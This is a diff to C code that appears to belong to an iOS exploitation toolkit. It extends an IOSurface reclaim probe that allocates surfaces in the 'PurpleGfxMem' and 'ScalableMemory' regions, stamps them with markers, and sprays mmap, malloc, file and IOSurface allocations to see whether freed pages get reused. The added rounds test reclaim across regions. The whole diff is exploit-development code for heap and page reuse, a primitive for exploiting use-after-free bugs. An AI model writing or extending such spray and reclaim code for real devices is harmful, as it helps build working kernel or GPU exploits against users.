@@ -1335,8 +1335,10 @@ static iosr_ref_t iosr_make_sized(int use_region, long alloc)
     n = CFNumberCreate(NULL, kCFNumberIntType, &pix);  CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), n);   CFRelease(n);
     n = CFNumberCreate(NULL, kCFNumberLongType, &alloc);
     CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);
-    if (use_region)
+    if (use_region == 1)
         CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
+    else if (use_region == 2)
+        CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("ScalableMemory"));
 
     iosr_ref_t s = g_iosr_create(props);
     CFRelease(props);
@@ -1745,7 +1747,7 @@ static int rcl_check(mach_port_t obj, mach_vm_size_t esz, int round,
 
 /* One (surface kind, reclaimer kind) experiment. */
 static int rcl_round(const char *dir, int use_region, size_t alloc, int sweeper,
-                     int round_no, int *stage_val)
+                     int round_no, int *stage_val, int spray_region)
 {
     int hit_kind = 0, hit_idx = -1, found = 0, made = 0;
     uint64_t hit_off = 0;
@@ -1762,7 +1764,7 @@ static int rcl_round(const char *dir, int use_region, size_t alloc, int sweeper,
     }
     uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
     size_t asz = g_iosr_getalloc(s);
-    uint32_t marker = 0xC0DE0000u | (uint32_t)(use_region & 1);
+    uint32_t marker = 0xC0DE0000u | (uint32_t)(use_region & 3);
     if (base) *(volatile uint32_t *)(uintptr_t)base = marker;
     uint32_t rb = base ? *(volatile uint32_t *)(uintptr_t)base : 0;
     mep_log("[*] iosurfreclaim r%d region=%d alloc=0x%zx id=0x%x base=0x%llx marker=0x%08x rb=0x%08x",
@@ -1802,7 +1804,7 @@ static int rcl_round(const char *dir, int use_region, size_t alloc, int sweeper,
     case RCL_KIND_MMAP_ANON: made = rcl_spray_mmap(alloc, sweeper); break;
     case RCL_KIND_MALLOC:    made = rcl_spray_malloc(alloc, sweeper); break;
     case RCL_KIND_FILE:      made = rcl_spray_file(dir, alloc, sweeper); break;
-    case RCL_KIND_IOSRF:     made = rcl_spray_iosrf(alloc, sweeper, use_region); break;
+    case RCL_KIND_IOSRF:     made = rcl_spray_iosrf(alloc, sweeper, spray_region); break;
     default: break;
     }
     mep_log("[*] iosurfreclaim r%d sweep kind=%d made=%d", round_no, sweeper, made);
@@ -1890,11 +1892,12 @@ int iosurf_reclaim_probe(const char *dir, int *stages)
     rcl_release_all();
     int rn = 0;
 
-    /* Sets 1-2: PurpleGfxMem and plain surfaces at 0x8000, five reclaimers. */
-    for (int ur = 0; ur < 2; ur++) {
+    /* Sets 1-3: plain, PurpleGfxMem and ScalableMemory victims at 0x8000,
+       five reclaimers each.  spray_region == victim region. */
+    for (int ur = 0; ur < 3; ur++) {
         for (int si = 0; si < 5; si++) {
             int st = 0;
-            rcl_round(dir, ur, RCL_ALLOC, sweepers[si], rn, &st);
+            rcl_round(dir, ur, RCL_ALLOC, sweepers[si], rn, &st, ur);
             mep_log("[*] iosurfreclaim round %d region=%d sweeper=%s stage=%d",
                     rn, ur, names[sweepers[si]], st);
             stages[rn] = st;
@@ -1902,11 +1905,24 @@ int iosurf_reclaim_probe(const char *dir, int *stages)
         }
     }
 
-    /* Set 3: IOSurface-vs-IOSurface recycling across size classes (control). */
+    /* Set 4: cross-region controls - does a fresh surface of one memory
+       region take the freed pages of another? */
+    static const int cross[][2] = { {2, 0}, {2, 1}, {2, 2}, {1, 2}, {0, 2} };
+    for (int ci = 0; ci < 5; ci++) {
+        int st = 0;
+        rcl_round(dir, cross[ci][0], RCL_ALLOC, RCL_KIND_IOSRF, rn, &st,
+                  cross[ci][1]);
+        mep_log("[*] iosurfreclaim round %d victim=%d spray=%d stage=%d",
+                rn, cross[ci][0], cross[ci][1], st);
+        stages[rn] = st;
+        rn++;
+    }
+
+    /* Set 5: IOSurface-vs-IOSurface recycling across size classes (control). */
     size_t cls[] = { 0x4000, 0x8000, 0x10000 };
     for (int ci = 0; ci < 3; ci++) {
         int st = 0;
-        rcl_round(dir, 1, cls[ci], RCL_KIND_IOSRF, rn, &st);
+        rcl_round(dir, 1, cls[ci], RCL_KIND_IOSRF, rn, &st, 1);
         mep_log("[*] iosurfreclaim round %d region=1 sweeper=iosrf class=0x%zx stage=%d",
                 rn, cls[ci], st);
         stages[rn] = st;
